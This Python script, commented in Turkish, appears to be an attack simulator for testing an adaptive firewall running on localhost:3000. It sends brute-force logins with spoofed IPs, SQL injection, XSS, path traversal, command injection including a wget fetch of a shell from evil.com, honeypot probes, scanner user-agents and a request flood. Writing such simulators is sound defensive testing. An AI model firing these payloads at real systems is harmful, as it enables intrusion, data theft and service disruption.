#!/usr/bin/env python3
"""
Adaptive Firewall — Saldiri Simulatoru (Attack Simulator)

Internete acilmadan, localhost ortaminda gercekci saldiri trafigi uretir.
Hedef siteye (localhost:3000) farkli IP'lerden geliyormus gibi
cesitli saldirilar gonderir.

Kullanim:
  python3 attack_sim.py                    -> interaktif menu
  python3 attack_sim.py --all              -> tum saldiri turlerini sirayla
  python3 attack_sim.py --brute            -> sadece brute force
  python3 attack_sim.py --xss              -> sadece XSS
  python3 attack_sim.py --sqli             -> sadece SQL injection
  python3 attack_sim.py --honeypot         -> honeypot tuzagi
  python3 attack_sim.py --flood            -> DDoS/flood
  python3 attack_sim.py --mixed            -> karma saldiri (tek IP, cok tur)
"""

import sys
import time
import random
import urllib.request
import json

TARGET = "http://localhost:3000"

# Simulasyon icin sahte saldirgan IP'leri (gercek tehdit istihbaratindan ornek araliklar)
ATTACKER_IPS = [
    "185.220.101.45",   # bilinen Tor cikis dugumu araligi
    "45.155.205.10",
    "103.149.28.50",
    "194.165.16.78",
    "91.240.118.222",
    "212.193.30.88",
]

# ANSI renkler
G = "\033[92m"
R = "\033[91m"
Y = "\033[93m"
C = "\033[96m"
GR = "\033[90m"
RST = "\033[0m"
B = "\033[1m"


def send(path, method="GET", body=None, ip=None, ua=None):
    """Hedefe istek gonder. X-Forwarded-For ile sahte IP."""
    url = TARGET + path
    headers = {"Content-Type": "application/json"}
    if ip:
        headers["X-Forwarded-For"] = ip
    if ua:
        headers["User-Agent"] = ua
    data = json.dumps(body).encode() if body else None
    try:
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        with urllib.request.urlopen(req, timeout=4) as res:
            return res.status, res.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return 0, str(e)


def log(color, tag, msg):
    print(f"{color}[{tag}]{RST} {msg}")


# ── SALDIRI SENARYOLARI ───────────────────────────────────────────────────────

def attack_brute_force(ip=None):
    """Brute force — hizli ardisik basarisiz girisler."""
    ip = ip or random.choice(ATTACKER_IPS)
    log(C, "BRUTE", f"{ip} adresinden brute force basliyor...")
    users = ["admin", "root", "administrator", "test", "user", "guest"]
    passwords = ["123456", "password", "admin", "root", "12345", "qwerty",
                 "letmein", "welcome", "abc123", "111111"]
    for i in range(10):
        u = random.choice(users)
        p = random.choice(passwords)
        status, _ = send("/api/login", "POST", {"username": u, "password": p}, ip)
        print(f"  {GR}deneme {i+1:2d}/10{RST}  {u}:{p}  -> {status}")
        time.sleep(0.3)
    log(R, "BRUTE", f"{ip} brute force tamamlandi (10 deneme)")


def attack_slow_brute(ip=None):
    """Yavas brute force — uzun araliklarla, tespitten kacma denemesi."""
    ip = ip or random.choice(ATTACKER_IPS)
    log(C, "SLOW", f"{ip} adresinden YAVAS brute force basliyor (gizli)...")
    for i in range(16):
        send("/api/login", "POST",
             {"username": "admin", "password": f"try{i}"}, ip)
        print(f"  {GR}yavas deneme {i+1}/16{RST}  (3sn arayla)")
        time.sleep(3)
    log(R, "SLOW", f"{ip} yavas brute force tamamlandi")


def attack_sqli(ip=None):
    """SQL injection denemeleri."""
    ip = ip or random.choice(ATTACKER_IPS)
    log(C, "SQLI", f"{ip} adresinden SQL injection basliyor...")
    payloads = [
        "' OR 1=1 --",
        "admin' --",
        "' UNION SELECT username, password FROM users --",
        "'; DROP TABLE users; --",
        "1' AND SLEEP(5) --",
    ]
    for p in payloads:
        status, _ = send(f"/api/search?q={urllib.parse.quote(p)}", "GET", ip=ip)
        print(f"  {GR}payload{RST}  {p[:40]:40s}  -> {status}")
        time.sleep(0.4)
    log(R, "SQLI", f"{ip} SQL injection tamamlandi")


def attack_xss(ip=None):
    """XSS denemeleri."""
    ip = ip or random.choice(ATTACKER_IPS)
    log(C, "XSS", f"{ip} adresinden XSS basliyor...")
    payloads = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)",
        "<svg onload=alert(1)>",
    ]
    for p in payloads:
        status, _ = send("/api/comment", "POST", {"text": p}, ip)
        print(f"  {GR}payload{RST}  {p[:40]:40s}  -> {status}")
        time.sleep(0.4)
    log(R, "XSS", f"{ip} XSS tamamlandi")


def attack_path_traversal(ip=None):
    """Path traversal denemeleri."""
    ip = ip or random.choice(ATTACKER_IPS)
    log(C, "PATH", f"{ip} adresinden path traversal basliyor...")
    payloads = [
        "../../../etc/passwd",
        "..\\..\\windows\\system32",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]
    for p in payloads:
        status, _ = send(f"/api/profile?file={urllib.parse.quote(p)}", "GET", ip=ip)
        print(f"  {GR}payload{RST}  {p[:40]:40s}  -> {status}")
        time.sleep(0.4)
    log(R, "PATH", f"{ip} path traversal tamamlandi")


def attack_command_injection(ip=None):
    """Komut enjeksiyonu denemeleri."""
    ip = ip or random.choice(ATTACKER_IPS)
    log(C, "CMD", f"{ip} adresinden komut enjeksiyonu basliyor...")
    payloads = [
        "test; cat /etc/passwd",
        "input | bash -i",
        "$(wget http://evil.com/shell)",
    ]
    for p in payloads:
        status, _ = send("/api/comment", "POST", {"text": p}, ip)
        print(f"  {GR}payload{RST}  {p[:40]:40s}  -> {status}")
        time.sleep(0.4)
    log(R, "CMD", f"{ip} komut enjeksiyonu tamamlandi")


def attack_honeypot(ip=None):
    """Honeypot — gizli tuzak endpoint'lere erisim."""
    ip = ip or random.choice(ATTACKER_IPS)
    log(C, "HONEY", f"{ip} adresinden honeypot taramasi basliyor...")
    traps = ["/wp-admin", "/.env", "/phpmyadmin", "/.git/config"]
    for t in traps:
        status, _ = send(t, "GET", ip=ip)
        print(f"  {GR}tuzak{RST}  {t:30s}  -> {status}")
        time.sleep(0.3)
    log(R, "HONEY", f"{ip} honeypot tuzagina dustu")


def attack_bot(ip=None):
    """Kotu bot — sqlmap/nikto gibi araclarla tarama."""
    ip = ip or random.choice(ATTACKER_IPS)
    log(C, "BOT", f"{ip} adresinden bot taramasi basliyor...")
    bots = ["sqlmap/1.7", "Nikto/2.5", "Nmap Scripting Engine",
            "masscan/1.3", "gobuster/3.5"]
    for bot in bots:
        status, _ = send("/", "GET", ip=ip, ua=bot)
        print(f"  {GR}bot{RST}  {bot:30s}  -> {status}")
        time.sleep(0.4)
    log(R, "BOT", f"{ip} bot taramasi tamamlandi")


def attack_flood(ip=None):
    """DDoS/flood — cok kisa surede asiri istek."""
    ip = ip or random.choice(ATTACKER_IPS)
    log(C, "FLOOD", f"{ip} adresinden flood basliyor (60 istek)...")
    for i in range(60):
        send("/api/ping", "GET", ip=ip)
        if (i + 1) % 10 == 0:
            print(f"  {GR}{i+1}/60 istek gonderildi{RST}")
    log(R, "FLOOD", f"{ip} flood tamamlandi")


def attack_mixed(ip=None):
    """Karma saldiri — tek IP, birden cok saldiri turu."""
    ip = ip or random.choice(ATTACKER_IPS)
    log(C, "MIXED", f"{ip} adresinden KARMA saldiri basliyor...")
    print(f"  {Y}> brute force{RST}")
    for i in range(6):
        send("/api/login", "POST", {"username": "admin", "password": f"x{i}"}, ip)
        time.sleep(0.2)
    print(f"  {Y}> SQL injection{RST}")
    send(f"/api/search?q={urllib.parse.quote(chr(39)+' OR 1=1 --')}", "GET", ip=ip)
    print(f"  {Y}> XSS{RST}")
    send("/api/comment", "POST", {"text": "<script>alert(1)</script>"}, ip)
    log(R, "MIXED", f"{ip} karma saldiri tamamlandi (3 farkli tur)")


# ── MENU ──────────────────────────────────────────────────────────────────────

SCENARIOS = {
    "1": ("Brute Force", attack_brute_force),
    "2": ("Yavas Brute Force", attack_slow_brute),
    "3": ("SQL Injection", attack_sqli),
    "4": ("XSS", attack_xss),
    "5": ("Path Traversal", attack_path_traversal),
    "6": ("Komut Enjeksiyonu", attack_command_injection),
    "7": ("Honeypot", attack_honeypot),
    "8": ("Kotu Bot", attack_bot),
    "9": ("DDoS / Flood", attack_flood),
    "10": ("Karma Saldiri", attack_mixed),
}


def banner():
    print(f"\n{B}{C}{'=' * 52}{RST}")
    print(f"{B}{C}   ADAPTIVE FIREWALL — SALDIRI SIMULATORU{RST}")
    print(f"{B}{C}{'=' * 52}{RST}")
    print(f"  Hedef: {TARGET}\n")


def menu():
    banner()
    for key, (name, _) in SCENARIOS.items():
        print(f"  {Y}{key:>2s}{RST}  {name}")
    print(f"  {Y} a{RST}  TUMU (sirayla)")
    print(f"  {Y} q{RST}  Cikis\n")

    while True:
        choice = input(f"{C}Secim > {RST}").strip().lower()
        if choice == "q":
            break
        elif choice == "a":
            run_all()
        elif choice in SCENARIOS:
            print()
            SCENARIOS[choice][1]()
            print()
        else:
            print(f"{R}Gecersiz secim{RST}")


def run_all():
    """Tum saldiri turlerini sirayla calistir."""
    banner()
    order = ["1", "3", "4", "5", "6", "7", "8", "9", "10"]
    for key in order:
        name, func = SCENARIOS[key]
        print(f"\n{B}--- {name} ---{RST}")
        func()
        time.sleep(1)
    print(f"\n{G}{B}Tum saldirilar tamamlandi.{RST}\n")


def main():
    import urllib.parse
    globals()["urllib"].parse = urllib.parse

    args = sys.argv[1:]
    if not args:
        menu()
        return

    flag = args[0]
    mapping = {
        "--all": run_all,
        "--brute": attack_brute_force,
        "--slow": attack_slow_brute,
        "--sqli": attack_sqli,
        "--xss": attack_xss,
        "--path": attack_path_traversal,
        "--cmd": attack_command_injection,
        "--honeypot": attack_honeypot,
        "--bot": attack_bot,
        "--flood": attack_flood,
        "--mixed": attack_mixed,
    }
    if flag in mapping:
        banner()
        mapping[flag]()
    else:
        print(__doc__)


if __name__ == "__main__":
    import urllib.parse  # noqa
    main()
